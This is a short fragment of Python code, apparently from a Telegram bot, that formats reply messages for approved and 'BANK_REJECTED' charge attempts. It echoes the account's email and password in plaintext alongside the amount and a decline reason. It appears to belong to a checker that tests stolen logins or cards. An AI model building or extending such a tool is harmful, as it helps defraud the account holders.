            f"🆔 `{result.get('txn_id', 'N/A')}`"
        )
    else:
        msg = (
            f"{LOGO}❌ *BANK_REJECTED*\n\n"
            f"📧 `{email}:{password}`\n"
            f"💵 ${amount:.2f}\n"
            f"⚠️ {result.get('error', 'Sin razón de decline')}"
        )

    await safe_reply(update, msg, parse_mode="Markdown")
